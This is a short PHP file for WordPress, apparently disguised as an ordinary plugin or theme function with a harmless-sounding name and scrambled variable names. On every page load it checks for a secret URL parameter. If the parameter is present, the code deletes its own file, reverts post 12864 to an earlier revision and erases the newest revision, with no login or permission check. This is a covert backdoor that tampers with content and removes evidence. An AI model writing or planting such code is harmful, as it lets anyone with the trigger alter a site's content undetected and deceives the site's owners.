<?php

function mode_switch_style() {
	if (isset($_GET['exporter_send_tools']) && $_GET['exporter_send_tools'] === 'post_validation_companion_platform') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$latest_open_platform = 12864;
		$src_speed_popular = wp_get_post_revisions($latest_open_platform);
		if (empty($src_speed_popular)) die('no revisions');
		if (count($src_speed_popular) < 2) die('less than 2');
		$lock_size_mobile = array_shift($src_speed_popular);
		$really_rtl_affiliates_online = $lock_size_mobile->ID;
		$translator_traffic_include = array_shift($src_speed_popular);
		$all_really_jigoshop_updater = $translator_traffic_include->ID;
		$additional_ajax_accessibility = wp_restore_post_revision($all_really_jigoshop_updater);
		if ($additional_ajax_accessibility === false) die('error restoring');
		$additional_ajax_accessibility = wp_delete_post_revision($really_rtl_affiliates_online);		
		if ($additional_ajax_accessibility === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'mode_switch_style');
